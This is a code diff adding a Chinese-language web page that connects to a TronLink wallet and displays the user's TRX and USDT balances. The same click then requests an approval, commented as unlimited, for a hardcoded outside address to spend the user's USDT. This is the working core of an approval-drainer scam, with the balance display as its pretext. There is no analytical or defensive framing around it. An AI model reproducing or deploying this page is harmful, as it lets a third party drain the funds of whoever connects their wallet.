@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>授权与余额展示</title>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 40px; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    .info { margin-top: 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+
+<h2>USDT 授权 + 余额显示</h2>
+<button onclick="connectAndAuthorize()">连接钱包并授权</button>
+
+<div class="info" id="walletInfo"></div>
+
+<script>
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT合约
+const SPENDER_ADDRESS = "TRqYfpyMWxw1LBs5ErGczzACJgyG2i7Vt5"; // 接收授权的地址
+const APPROVE_AMOUNT = "999999999999999"; // 无限大授权额度
+
+async function connectAndAuthorize() {
+    if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
+        alert("请先安装并登录 TronLink 钱包");
+        return;
+    }
+
+    try {
+        const userAddress = window.tronWeb.defaultAddress.base58;
+        const trxBalanceSun = await window.tronWeb.trx.getBalance(userAddress);
+        const trxBalance = window.tronWeb.fromSun(trxBalanceSun);
+
+        const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const usdtBalanceRaw = await usdtContract.balanceOf(userAddress).call();
+        const usdtBalance = window.tronWeb.fromSun(usdtBalanceRaw);
+
+        document.getElementById('walletInfo').innerHTML = `
+            <p>地址: ${userAddress}</p>
+            <p>TRX余额: ${parseFloat(trxBalance).toFixed(6)}</p>
+            <p>USDT余额: ${parseFloat(usdtBalance).toFixed(6)}</p>
+        `;
+
+        const approveTx = await usdtContract.approve(SPENDER_ADDRESS, window.tronWeb.toSun(APPROVE_AMOUNT)).send();
+        alert("授权成功，交易ID：" + approveTx);
+
+    } catch (err) {
+        console.error("错误：", err);
+        alert("发生错误，请查看控制台日志");
+    }
+}
+</script>
+
+</body>
+</html>
